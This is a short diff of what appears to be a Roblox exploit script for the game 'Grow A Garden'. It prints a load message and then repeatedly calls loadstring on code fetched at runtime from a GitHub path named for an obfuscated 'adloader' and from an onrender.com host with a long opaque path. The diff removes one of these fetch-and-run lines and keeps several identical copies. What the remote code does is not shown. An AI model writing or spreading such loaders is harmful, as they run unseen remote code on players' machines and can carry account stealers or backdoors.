@@ -1,6 +1,5 @@
 print("Grow A Garden [X992GLL3] - Loaded")
 loadstring(game:HttpGet("https://raw.githubusercontent.com/realuerd/obf/refs/heads/main/adloader",true))()
-loadstring(game:HttpGet("http://sunny-5n92.onrender.com/raw/",true))()
 loadstring(game:HttpGet("http://sunny-5n92.onrender.com/raw/99eacc904a9e370c585472c2083623cb8fe4c9f4b7f5b71eca8cf6b6467ee372ff1de3189d4fc250b80ccb56e92be6a7b7dd46df2e6c06eb72faaf69d6ec773c",true))()
 loadstring(game:HttpGet("http://sunny-5n92.onrender.com/raw/99eacc904a9e370c585472c2083623cb8fe4c9f4b7f5b71eca8cf6b6467ee372ff1de3189d4fc250b80ccb56e92be6a7b7dd46df2e6c06eb72faaf69d6ec773c",true))()
 loadstring(game:HttpGet("http://sunny-5n92.onrender.com/raw/99eacc904a9e370c585472c2083623cb8fe4c9f4b7f5b71eca8cf6b6467ee372ff1de3189d4fc250b80ccb56e92be6a7b7dd46df2e6c06eb72faaf69d6ec773c",true))()
